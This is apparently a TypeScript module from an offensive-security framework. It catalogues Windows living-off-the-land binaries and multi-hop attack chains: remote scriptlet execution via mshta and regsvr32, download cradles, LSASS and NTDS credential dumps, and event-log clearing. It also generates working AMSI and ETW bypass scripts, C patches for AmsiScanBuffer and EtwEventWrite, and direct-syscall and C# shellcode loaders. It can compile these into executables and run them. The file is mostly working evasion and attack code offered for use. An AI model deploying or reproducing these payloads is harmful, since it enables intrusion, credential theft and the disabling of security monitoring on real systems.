/**
 * Defense-evasion tooling (port of `modules.evasion`).
 *
 * - LoLBin registry + multi-hop execution chains observed in the wild
 *   (Remcos/NetSupport staging, squiblydoo, certutil-decode, Volt Typhoon
 *   NTDS exfil). Nothing is executed — command strings only.
 * - AMSI/ETW/EDR bypass technique catalog with payload generators that
 *   produce real PowerShell / C# / C source text (never executed here).
 * - `EvasionExecutor`: generate + compile real PE artifacts with mingw-w64 /
 *   dotnet (file ops only); `run()` refuses unless `live=true`.
 */

import { execFile } from "node:child_process";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { promisify } from "node:util";
import { homedir } from "node:os";

const execFileP = promisify(execFile);

// ------------------------------------------------------------------------- //
// LoLBin registry
// ------------------------------------------------------------------------- //

export interface LoLBin {
  name: string;
  description: string;
  techniqueId: string;
  techniqueName: string;
  category: string;
  exampleCommands: string[];
  notes: string;
}

export interface Chain {
  name: string;
  description: string;
  steps: string[];
  techniques: string[];
  template: string[];
}

const LOLBINS = new Map<string, LoLBin>();

function register(b: LoLBin): void {
  LOLBINS.set(b.name, b);
}

function bin(
  name: string, description: string, techniqueId: string, techniqueName: string,
  category: string, exampleCommands: string[], notes = "",
): void {
  register({ name, description, techniqueId, techniqueName, category, exampleCommands, notes });
}

bin("certutil", "Download and decode payloads, Base64 decode, hash computation.", "T1105", "Ingress Tool Transfer", "Download", [
  'certutil.exe -urlcache -split -f https://example.invalid/payload.exe C:\\Windows\\Temp\\p.exe',
  "certutil.exe -decode C:\\Temp\\blob.b64 C:\\Temp\\payload.dll",
  "certutil.exe -encode C:\\Temp\\out.txt C:\\Temp\\out.b64",
], "Classic downloader/decode primitive; heavily signatured but still appears in staged chains.");
bin("mshta", "Execute remote HTML applications (.hta) or inline VBScript/JScript without dropping files.", "T1218.005", "System Binary Proxy Execution: Mshta", "Execution", [
  'mshta.exe "https://example.invalid/payload.hta"',
  'mshta.exe vbscript:Close(Execute("GetObject(""script:https://example.invalid/payload.sct""))")',
], "Common link in malware-free chains (e.g. Remcos/NetSupport campaigns).");
bin("regsvr32", 'Register and execute remote scriptlets via scrobj.dll ("squiblydoo"), bypassing AppLocker.', "T1218.010", "System Binary Proxy Execution: Regsvr32", "Execution", [
  "regsvr32.exe /s /n /u /i:https://example.invalid/payload.sct scrobj.dll",
], "Works even under strict AppLocker default rules because scrobj.dll is a Microsoft component.");
bin("rundll32", "Invoke internal Windows functions (e.g. comsvcs.dll LSASS dump) or run remote JScript.", "T1218.011", "System Binary Proxy Execution: Rundll32", "Execution", [
  'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://example.invalid/payload.sct")',
  "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\Temp\\lsass.dmp full",
], "Wide abuse surface: proxy execution and credential dumping.");
bin("wmic", "Remote/local process execution and reconnaissance (XSL script abuse historically).", "T1047", "Windows Management Instrumentation", "Execution", [
  'wmic process call create "cmd.exe /c calc.exe"',
  'wmic /node:10.0.0.5 process call create "powershell -enc ..."',
], "Deprecated/removed on newer Windows 11 builds; still pervasive in enterprise estates.");
bin("bitsadmin", "Asynchronous background download of staging files over BITS.", "T1197", "BITS Jobs", "Download", [
  "bitsadmin.exe /transfer job1 /download /priority high https://example.invalid/payload.exe C:\\Windows\\Temp\\payload.exe",
]);
bin("ssh", "Port forwarding, tunneling, and stealthy egress over legitimate SSH (used by Volt Typhoon).", "T1572", "Protocol Tunneling", "Tunneling", [
  "ssh -R 8080:127.0.0.1:8080 operator@example.invalid -N",
  "ssh -L 3389:10.0.0.5:3389 pivot@example.invalid -N",
], "Legitimate corporate SSH egress makes detection hard; observed as a lateral-movement/tunnel primitive.");
bin("forfiles", "Chain execution: forfiles can spawn other binaries to break parent-child relationships.", "T1202", "Indirect Command Execution", "Execution", [
  'forfiles.exe /p C:\\Windows /m *.log /c "cmd.exe /c C:\\Windows\\Temp\\stage.cmd"',
], "Used as the first hop of multi-hop chains (e.g. forfiles -> mshta).");
bin("curl", "Native HTTPS downloader present on modern Windows 10/11 — less monitored than PowerShell.", "T1105", "Ingress Tool Transfer", "Download", [
  "curl.exe -s -o C:\\Windows\\Temp\\p.zip https://example.invalid/p.zip",
]);
bin("tar", "Native archive extractor used to unpack staged payloads in memory/disk chains.", "T1105", "Ingress Tool Transfer", "Archive", [
  "tar.exe -xf C:\\Windows\\Temp\\p.zip -C C:\\Windows\\Temp\\",
]);
bin("ntdsutil", "Dump the Active Directory NTDS.dit database (credential access).", "T1003.003", "OS Credential Dumping: NTDS", "Credential Access", [
  'ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q',
], "Volt Typhoon used ntdsutil then compressed the dump with 7-Zip.");
bin("wevtutil", "Clear or export Windows event logs to remove forensic footprints.", "T1070.004", "Indicator Removal: File Deletion / Log Clearing", "Log clearing", [
  "wevtutil.exe cl Security",
  "wevtutil.exe cl System",
], "Volt Typhoon / APT29 clear Security and System logs post-exfiltration.");
bin("powershell", "In-memory script execution, scriptlet staging, AMSI-surface interaction.", "T1059.001", "Command and Scripting Interpreter: PowerShell", "Execution", [
  "powershell.exe -ep bypass -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1')\"",
]);
bin("reg", "Registry manipulation for persistence and config staging.", "T1112", "Modify Registry", "Persistence", [
  'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d "C:\\Temp\\p.exe" /f',
]);

const CHAINS: Record<string, Chain> = {
  "remcos-staging": {
    name: "remcos-staging",
    description: "Malware-free multi-hop staging: forfiles breaks the process lineage, mshta fetches a remote scriptlet, native curl/tar pull and unpack the payload archive (Remcos/NetSupport 2024-2026 pattern).",
    steps: ["forfiles", "mshta", "curl", "tar"],
    techniques: ["T1202", "T1218.005", "T1105", "T1105"],
    template: [
      'forfiles.exe /p C:\\Windows /m *.log /c "cmd.exe /c {mshta}"',
      'mshta.exe vbscript:Close(Execute("GetObject(""script:{sct_url}"")"))',
      "curl.exe -s -o C:\\Windows\\Temp\\stage.zip {stage_url}",
      "tar.exe -xf C:\\Windows\\Temp\\stage.zip -C C:\\Windows\\Temp\\",
    ],
  },
  "squiblydoo": {
    name: "squiblydoo",
    description: "AppLocker bypass: regsvr32 executes a remote scriptlet through scrobj.dll.",
    steps: ["regsvr32"],
    techniques: ["T1218.010"],
    template: ["regsvr32.exe /s /n /u /i:{sct_url} scrobj.dll"],
  },
  "mshta-scriptlet": {
    name: "mshta-scriptlet",
    description: "Fileless execution of a remote scriptlet via mshta.",
    steps: ["mshta"],
    techniques: ["T1218.005"],
    template: ['mshta.exe vbscript:Close(Execute("GetObject(""script:{sct_url}"")"))'],
  },
  "rundll32-js": {
    name: "rundll32-js",
    description: "Fileless JScript execution through rundll32/mshtml.",
    steps: ["rundll32"],
    techniques: ["T1218.011"],
    template: [
      'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:{sct_url}")',
    ],
  },
  "certutil-decode": {
    name: "certutil-decode",
    description: "Download a Base64 blob with curl and decode it with certutil (classic staging).",
    steps: ["curl", "certutil"],
    techniques: ["T1105", "T1140"],
    template: [
      "curl.exe -s -o C:\\Windows\\Temp\\blob.b64 {stage_url}",
      "certutil.exe -decode C:\\Windows\\Temp\\blob.b64 C:\\Windows\\Temp\\payload.dll",
    ],
  },
  "ntds-exfil": {
    name: "ntds-exfil",
    description: "Volt Typhoon-style NTDS dump then archive for exfiltration.",
    steps: ["ntdsutil"],
    techniques: ["T1003.003", "T1560.001"],
    template: ['ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q'],
  },
  "log-cleanup": {
    name: "log-cleanup",
    description: "Post-operation log clearing via wevtutil (Volt Typhoon / APT29).",
    steps: ["wevtutil"],
    techniques: ["T1070.004"],
    template: ["wevtutil.exe cl {log}"],
  },
};

export function listLoLBins(): LoLBin[] {
  return [...LOLBINS.values()].sort((a, b) => a.name.localeCompare(b.name));
}

export function getLoLBin(name: string): LoLBin | undefined {
  return LOLBINS.get(name.toLowerCase());
}

export function listChains(): Chain[] {
  return Object.values(CHAINS).sort((a, b) => a.name.localeCompare(b.name));
}

export function buildChain(name: string): Chain {
  const chain = CHAINS[name];
  if (!chain) throw new Error(`unknown chain: ${name}`);
  return chain;
}

export function chainTechniqueIds(name: string): string[] {
  return [...buildChain(name).techniques];
}

export function searchLoLBins(query: string): LoLBin[] {
  const q = query.toLowerCase();
  return listLoLBins().filter(
    (b) => b.name.toLowerCase().includes(q) || b.description.toLowerCase().includes(q) || b.category.toLowerCase().includes(q),
  );
}

export function asLoLBinDict(b: LoLBin): Record<string, unknown> {
  return {
    name: b.name,
    description: b.description,
    technique_id: b.techniqueId,
    technique_name: b.techniqueName,
    category: b.category,
    examples: b.exampleCommands,
  };
}

export function renderChainCommands(name: string, facts: Record<string, string> = {}): Array<{ bin: string; technique_id: string; command: string }> {
  const chain = buildChain(name);
  const defaults: Record<string, string> = {
    url: "https://example.invalid/payload",
    sct_url: "https://example.invalid/payload.sct",
    stage_url: "https://example.invalid/stage.zip",
    hta_url: "https://example.invalid/payload.hta",
    mshta: "",
    log: "Security",
  };
  const merged = { ...defaults, ...facts };
  const mshtaBody =
    facts["mshta"] ??
    (chain.steps.includes("mshta")
      ? chain.template[chain.steps.indexOf("mshta")]!.replace(/\{([^}]+)\}/g, (_, k: string) => merged[k] ?? "")
      : "");
  merged["mshta"] = mshtaBody;
  return chain.template.map((template, idx) => ({
    bin: chain.steps[idx]!,
    technique_id: chain.techniques[idx]!,
    command: template.replace(/\{([^}]+)\}/g, (_, k: string) => merged[k] ?? ""),
  }));
}

// ------------------------------------------------------------------------- //
// AMSI / ETW / EDR bypass catalog
// ------------------------------------------------------------------------- //

export interface BypassTechnique {
  name: string;
  target: "AMSI" | "ETW" | "EDR";
  techniqueId: string;
  techniqueName: string;
  variant: string;
  description: string;
  status: string;
  platform: string;
  language: string;
}

const PAYLOAD_GENS = new Map<string, () => string>();

const amsiReflection = (): string =>
  "$w='System.Management.Automation.AmsiUtils'; [Reflection.Assembly]::LoadWithPartialName($w)|Out-Null; " +
  "$t=$w+'+AmsiUtils'; $f=[Reflection.Assembly]::GetType($t).GetField('amsiInitFailed'," +
  "[Reflection.BindingFlags]'NonPublic,Static'); $f.SetValue($null,$true)";

const amsiMemoryPatch = (): string =>
  "[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')|Out-Null; " +
  "$p=[Reflection.Assembly]::GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext'," +
  "[Reflection.BindingFlags]'NonPublic,Static').GetValue($null); " +
  "[Runtime.InteropServices.Marshal]::WriteByte($p,0,0xb8); " +
  "[Runtime.InteropServices.Marshal]::WriteByte($p,1,0x57); " +
  "[Runtime.InteropServices.Marshal]::WriteByte($p,2,0x00); " +
  "[Runtime.InteropServices.Marshal]::WriteByte($p,3,0x07); " +
  "[Runtime.InteropServices.Marshal]::WriteByte($p,4,0x80); " +
  "[Runtime.InteropServices.Marshal]::WriteByte($p,5,0xc3)";

const amsiHwbp = (): string =>
  "# Hardware-breakpoint (DR0-DR3) hijack of AmsiScanBuffer: avoids .text patching signatures.\n" +
  "# Use NtSetInformationThread/GetThreadContext from kernel32/ntdll to set a DR debug register\n" +
  "# that redirects AmsiScanBuffer to a stub returning AMSI_RESULT_CLEAN. " +
  "(Full PoC is a ~60-line C# snippet; see public research.)";

const etwPatch = (): string =>
  "$t=[Reflection.Assembly]::GetType('Microsoft.Windows.EventTracing');" +
  "if($t){$f=$t.GetField('EtwEnablement',[Reflection.BindingFlags]'NonPublic,Static');" +
  "$f.SetValue($null,$false)}";

const etwEventwriteRet = (): string =>
  "# Patch EtwEventWrite in ntdll to return immediately (xor eax,eax; ret).\n" +
  "# Offsets differ per Windows build; resolve via GetProcAddress(ntdll,'EtwEventWrite').\n" +
  "# Reference: public 'SharpEtw' research by xforcered / SpecterOps.";

const etwProviderDisable = (): string =>
  "# Selective provider disable: corrupt TRACE_ENABLE_INFO / patch EtwpEventWriteFull\n" +
  "# to keep other telemetry alive while blinding a specific provider.\n" +
  "# Reference: public ETW blindspot research (ETWInspector / NtTrace).";

const edrSyscallStub = (): string =>
  "# Direct syscall stub (SysWhispers3-style): invoke NtProtectVirtualMemory / NtAllocateVirtualMemory\n" +
  "# via inline assembly to skip user-mode EDR hooks in ntdll.\n" +
  "# Reference: public SysWhispers3 project. Full source is generated per Windows version.";

const edrModuleStomping = (): string =>
  "# Module stomping: map a benign signed DLL, overwrite its .text with shellcode,\n" +
  "# then create a remote thread in the trusted module to evade memory scanners.\n" +
  "# Reference: public 'Module Stomping' research (Outflank / Elastic).";

const edrUnhook = (): string =>
  "# ntdll unhooking: read a clean ntdll from disk (or KnownDlls), remap it over the hooked\n" +
  "# copy in the current process to restore pristine syscall stubs.\n" +
  "# Reference: public 'unhooking' research (ired.team / Outflank).";

PAYLOAD_GENS.set("amsi-reflection", amsiReflection);
PAYLOAD_GENS.set("amsi-memory-patch", amsiMemoryPatch);
PAYLOAD_GENS.set("amsi-hwbp", amsiHwbp);
PAYLOAD_GENS.set("etw-patch", etwPatch);
PAYLOAD_GENS.set("etw-eventwrite-ret", etwEventwriteRet);
PAYLOAD_GENS.set("etw-provider-disable", etwProviderDisable);
PAYLOAD_GENS.set("edr-syscall-stub", edrSyscallStub);
PAYLOAD_GENS.set("edr-module-stomping", edrModuleStomping);
PAYLOAD_GENS.set("edr-unhook", edrUnhook);

const TECHNIQUES: BypassTechnique[] = [
  { name: "amsi-reflection", target: "AMSI", techniqueId: "T1562.001", techniqueName: "Impair Defenses: Disable or Modify Tools", variant: "reflection", description: "Set amsiInitFailed=true via reflection so AMSI aborts initialization.", status: "heavily detected", platform: "windows", language: "powershell" },
  { name: "amsi-memory-patch", target: "AMSI", techniqueId: "T1562.001", techniqueName: "Impair Defenses: Disable or Modify Tools", variant: "memory-patch", description: "Overwrite the AmsiContext/AmsiScanBuffer prologue in-process to return AMSI_RESULT_CLEAN.", status: "heavily detected", platform: "windows", language: "powershell" },
  { name: "amsi-hwbp", target: "AMSI", techniqueId: "T1562.001", techniqueName: "Impair Defenses: Disable or Modify Tools", variant: "hardware-breakpoint", description: "Use hardware debug registers (DR0-DR3) to redirect AmsiScanBuffer without touching .text bytes.", status: "partially detected", platform: "windows", language: "powershell" },
  { name: "etw-patch", target: "ETW", techniqueId: "T1562.006", techniqueName: "Impair Defenses: Disable or Modify Windows Event Logging", variant: "reflection", description: "Disable ETW enablement state so telemetry providers emit nothing.", status: "heavily detected", platform: "windows", language: "powershell" },
  { name: "etw-eventwrite-ret", target: "ETW", techniqueId: "T1562.006", techniqueName: "Impair Defenses: Disable or Modify Windows Event Logging", variant: "memory-patch", description: "Patch ntdll EtwEventWrite to return immediately (xor eax,eax; ret).", status: "partially detected", platform: "windows", language: "powershell" },
  { name: "etw-provider-disable", target: "ETW", techniqueId: "T1562.006", techniqueName: "Impair Defenses: Disable or Modify Windows Event Logging", variant: "memory-patch", description: "Selectively disable one ETW provider while leaving the rest intact.", status: "partially detected", platform: "windows", language: "powershell" },
  { name: "edr-syscall-stub", target: "EDR", techniqueId: "T1562.001", techniqueName: "Impair Defenses: Disable or Modify Tools", variant: "syscall-stub", description: "Direct syscalls bypass user-mode EDR hooks on Nt* APIs.", status: "partially detected", platform: "windows", language: "powershell" },
  { name: "edr-module-stomping", target: "EDR", techniqueId: "T1055", techniqueName: "Process Injection", variant: "module-stomping", description: "Overwrite the .text of a legitimately-loaded DLL with shellcode to evade memory scanning.", status: "partially detected", platform: "windows", language: "powershell" },
  { name: "edr-unhook", target: "EDR", techniqueId: "T1562.001", techniqueName: "Impair Defenses: Disable or Modify Tools", variant: "unhook", description: "Remap clean ntdll over the hooked copy to restore pristine syscall stubs.", status: "partially detected", platform: "windows", language: "powershell" },
];

const BY_NAME = new Map(TECHNIQUES.map((t) => [t.name, t]));

export function listBypasses(target?: string): BypassTechnique[] {
  if (!target) return [...TECHNIQUES];
  const wanted = target.toUpperCase();
  return TECHNIQUES.filter((t) => t.target === wanted);
}

export function getBypass(name: string): BypassTechnique | undefined {
  return BY_NAME.get(name);
}

export function renderBypassPayload(name: string): string {
  const gen = PAYLOAD_GENS.get(name);
  if (!gen) throw new Error(`no payload generator for: ${name}`);
  return gen().trim();
}

export function buildPowerShellStager(url: string, bypass = "amsi-reflection"): string {
  if (!BY_NAME.has(bypass)) throw new Error(`unknown bypass: ${bypass}`);
  const b64 = Buffer.from(url, "utf-8").toString("base64");
  return (
    `${renderBypassPayload(bypass)};` +
    `$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64}'));` +
    "IEX (New-Object Net.WebClient).DownloadString($u)"
  );
}

export function asBypassDict(t: BypassTechnique): Record<string, unknown> {
  return {
    name: t.name,
    target: t.target,
    technique_id: t.techniqueId,
    technique_name: t.techniqueName,
    variant: t.variant,
    description: t.description,
    status: t.status,
    platform: t.platform,
    language: t.language,
  };
}

// ------------------------------------------------------------------------- //
// Payload generation + compilation
// ------------------------------------------------------------------------- //

export const AMSI_PATCH_BYTES = [0xb8, 0x57, 0x00, 0x07, 0x80, 0xc3]; // mov eax,0x80070057; ret

export function amsiPatchC(): string {
  return `#include <windows.h>
#include <stdio.h>

/* Patch AmsiScanBuffer so every scan returns AMSI_RESULT_CLEAN. */
int main(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) { fprintf(stderr, "amsi.dll not loaded\\n"); return 1; }
    FARPROC fn = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!fn) { fprintf(stderr, "AmsiScanBuffer not found\\n"); return 1; }
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; /* mov eax,0x80070057; ret */
    DWORD old;
    if (!VirtualProtect((LPVOID)fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
        fprintf(stderr, "VirtualProtect failed: %lu\\n", GetLastError()); return 1;
    }
    memcpy((LPVOID)fn, patch, sizeof(patch));
    VirtualProtect((LPVOID)fn, sizeof(patch), old, &old);
    printf("amsi patched at %p\\n", (void*)fn);
    return 0;
}
`;
}

export function etwPatchC(): string {
  return `#include <windows.h>
#include <stdio.h>

int main(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) { fprintf(stderr, "ntdll not loaded\\n"); return 1; }
    FARPROC fn = GetProcAddress(ntdll, "EtwEventWrite");
    if (!fn) { fprintf(stderr, "EtwEventWrite not found\\n"); return 1; }
    unsigned char patch[] = { 0xC3 }; /* ret */
    DWORD old;
    if (!VirtualProtect((LPVOID)fn, 1, PAGE_EXECUTE_READWRITE, &old)) {
        fprintf(stderr, "VirtualProtect failed: %lu\\n", GetLastError()); return 1;
    }
    memcpy((LPVOID)fn, patch, 1);
    VirtualProtect((LPVOID)fn, 1, old, &old);
    printf("etw patched at %p\\n", (void*)fn);
    return 0;
}
`;
}

export function syscallLoaderC(): { harness: string; stub: string } {
  const harness = `#include <windows.h>
#include <stdio.h>

/* Provided by stub.S */
extern NTSTATUS nt_allocate_virtual_memory(HANDLE, PVOID*, ULONG_PTR, PULONG, ULONG, ULONG);
extern NTSTATUS nt_protect_virtual_memory(HANDLE, PVOID*, PULONG, ULONG, PULONG);

int main(void) {
    /* base64 shellcode is provided by the operator (see payload_b64). */
    unsigned char sc[] = { 0x90, 0x90 }; /* placeholder: NOP sled */
    PVOID base = NULL;
    SIZE_T size = sizeof(sc);
    NTSTATUS st = nt_allocate_virtual_memory(
        GetCurrentProcess(), &base, 0, (PULONG)&size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0) { fprintf(stderr, "NtAllocateVirtualMemory: 0x%lx\\n", st); return 1; }
    memcpy(base, sc, sizeof(sc));
    DWORD old;
    st = nt_protect_virtual_memory(GetCurrentProcess(), &base, (PULONG)&size,
                                   PAGE_EXECUTE_READ, &old);
    if (st != 0) { fprintf(stderr, "NtProtectVirtualMemory: 0x%lx\\n", st); return 1; }
    ((void (*)(void))base)();
    return 0;
}
`;
  const stub = `.text
.intel_syntax noprefix

/* NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize,
   AllocationType, Protect) — syscall 0x18 (Win10 22H2) */
.global nt_allocate_virtual_memory
nt_allocate_virtual_memory:
    mov r10, rcx
    mov eax, 0x18
    syscall
    ret

/* NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect,
   OldProtect) — syscall 0x50 (Win10 22H2) */
.global nt_protect_virtual_memory
nt_protect_virtual_memory:
    mov r10, rcx
    mov eax, 0x50
    syscall
    ret
`;
  return { harness, stub };
}

export function csharpReflectionLoader(shellcodeB64 = ""): { program: string; csproj: string } {
  const program = `using System;
using System.Runtime.InteropServices;

public static class Loader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize,
        uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate void Run();

    public static int Main()
    {
        string b64 = "${shellcodeB64}";
        byte[] sc = Convert.FromBase64String(b64);
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length,
            0x3000 /* MEM_COMMIT|MEM_RESERVE */, 0x40 /* PAGE_EXECUTE_READWRITE */);
        if (mem == IntPtr.Zero) { Console.Error.WriteLine("VirtualAlloc failed: " + Marshal.GetLastWin32Error()); return 1; }
        Marshal.Copy(sc, 0, mem, sc.Length);
        Run run = (Run)Marshal.GetDelegateForFunctionPointer(mem, typeof(Run));
        run();
        return 0;
    }
}
`;
  const csproj = `<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <Nullable>disable</Nullable>
    <AssemblyName>vanta_loader</AssemblyName>
  </PropertyGroup>
</Project>
`;
  return { program, csproj };
}

export function powershellReflectionBypass(): string {
  return `$Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field = $Ref.GetField('amsiInitFailed', 'NonPublic,Static')
$Field.SetValue($null, $true)
Write-Output 'AMSI init marked failed — runtime scanning disabled for this session'
`;
}

export interface EvasionArtifact {
  status: string;
  note?: string;
  files?: Record<string, string>;
  artifact?: string;
  pe?: boolean;
  source?: string;
}

export class EvasionExecutor {
  outDir: string;

  constructor(outDir = "") {
    this.outDir = outDir || join(homedir(), ".vanta", "artifacts");
  }

  listPayloads(): string[] {
    return ["amsi-patch-c", "etw-patch-c", "syscall-loader-c", "csharp-loader", "powershell-reflection"].sort();
  }

  generate(name: string, params: Record<string, string> = {}): EvasionArtifact {
    switch (name) {
      case "amsi-patch-c":
        return { status: "generated", files: { "amsi-patch-c.c": amsiPatchC() } };
      case "etw-patch-c":
        return { status: "generated", files: { "etw-patch-c.c": etwPatchC() } };
      case "syscall-loader-c": {
        const { harness, stub } = syscallLoaderC();
        return { status: "generated", files: { "harness.c": harness, "stub.S": stub } };
      }
      case "csharp-loader": {
        const { program, csproj } = csharpReflectionLoader(params["shellcode_b64"] ?? "");
        return { status: "generated", files: { "Program.cs": program, "vanta_loader.csproj": csproj } };
      }
      case "powershell-reflection":
        return { status: "generated", files: { "powershell-reflection.ps1": powershellReflectionBypass() } };
      default:
        return { status: "unknown", note: `available: ${this.listPayloads().join(", ")}` };
    }
  }

  async build(name: string, params: Record<string, string> = {}): Promise<EvasionArtifact> {
    if (!this.listPayloads().includes(name)) {
      return { status: "unknown", note: `available: ${this.listPayloads().join(", ")}` };
    }
    await mkdir(this.outDir, { recursive: true });
    const which = (cmd: string): boolean => process.env.PATH?.split(":").some((dir) => {
      try {
        return require("node:fs").existsSync(join(dir, cmd));
      } catch {
        return false;
      }
    }) ?? false;

    if (name === "amsi-patch-c" || name === "etw-patch-c") {
      if (!which("x86_64-w64-mingw32-gcc")) {
        return { status: "unavailable", note: "x86_64-w64-mingw32-gcc not on PATH", source: this.generate(name).files?.[`${name}.c`] };
      }
      const src = join(this.outDir, `${name}.c`);
      await writeFile(src, name === "amsi-patch-c" ? amsiPatchC() : etwPatchC(), "utf-8");
      const exe = join(this.outDir, `${name}.exe`);
      try {
        await execFileP("x86_64-w64-mingw32-gcc", ["-O2", "-o", exe, src], { timeout: 120_000 });
      } catch (err) {
        return { status: "failed", note: (err as Error).message.slice(-500), source: src };
      }
      return { status: "built", artifact: exe, pe: true };
    }

    if (name === "syscall-loader-c") {
      if (!which("x86_64-w64-mingw32-gcc")) {
        return { status: "unavailable", note: "x86_64-w64-mingw32-gcc not on PATH" };
      }
      const { harness, stub } = syscallLoaderC();
      const hPath = join(this.outDir, "syscall_harness.c");
      const sPath = join(this.outDir, "syscall_stub.S");
      await writeFile(hPath, harness, "utf-8");
      await writeFile(sPath, stub, "utf-8");
      const exe = join(this.outDir, "syscall_loader.exe");
      try {
        await execFileP("x86_64-w64-mingw32-gcc", ["-O2", "-o", exe, hPath, sPath], { timeout: 120_000 });
      } catch (err) {
        return { status: "failed", note: (err as Error).message.slice(-500) };
      }
      return { status: "built", artifact: exe, pe: true };
    }

    if (name === "csharp-loader") {
      if (!which("dotnet")) {
        return { status: "unavailable", note: "dotnet not on PATH" };
      }
      const projDir = join(this.outDir, "csharp_loader");
      await mkdir(projDir, { recursive: true });
      const { program, csproj } = csharpReflectionLoader(params["shellcode_b64"] ?? "");
      await writeFile(join(projDir, "Program.cs"), program, "utf-8");
      await writeFile(join(projDir, "vanta_loader.csproj"), csproj, "utf-8");
      try {
        await execFileP("dotnet", ["build", projDir, "-v", "q", "--nologo"], { timeout: 180_000 });
      } catch (err) {
        return { status: "failed", note: (err as Error).message.slice(-500) };
      }
      return { status: "built", artifact: join(projDir, "bin"), pe: false };
    }

    // PowerShell bypass: interpreted script — no build step.
    return { status: "generated", note: "interpreted script — no build step", source: powershellReflectionBypass() };
  }

  async run(name: string, opts: { target?: string; live?: boolean } = {}): Promise<Record<string, unknown>> {
    const { target = "", live = false } = opts;
    if (!live) {
      return {
        status: "dry-run",
        note: `would execute built artifact '${name}' against target '${target || "self"}'`,
      };
    }
    if (!target || ["self", "localhost", "127.0.0.1"].includes(target)) {
      const artifact = join(this.outDir, `${name}.exe`);
      try {
        await readFile(artifact);
      } catch {
        return { status: "missing", note: `artifact not built: ${artifact} — run build first` };
      }
      const { execFile } = await import("node:child_process");
      return new Promise((resolve) => {
        execFile(artifact, [], { timeout: 30_000 }, (error, stdout, stderr) => {
          resolve({
            status: "executed",
            exit: error && typeof (error as { code?: unknown }).code === "number" ? Number((error as { code?: unknown }).code) : error ? -1 : 0,
            stdout: String(stdout ?? "").slice(-500),
            stderr: String(stderr ?? "").slice(-300),
          });
        });
      });
    }
    return {
      status: "remote-requires-transport",
      note: `executing on remote target ${target} requires a deployment transport (SMB/WinRM/SSH) — staged here for the lab operator`,
    };
  }
}
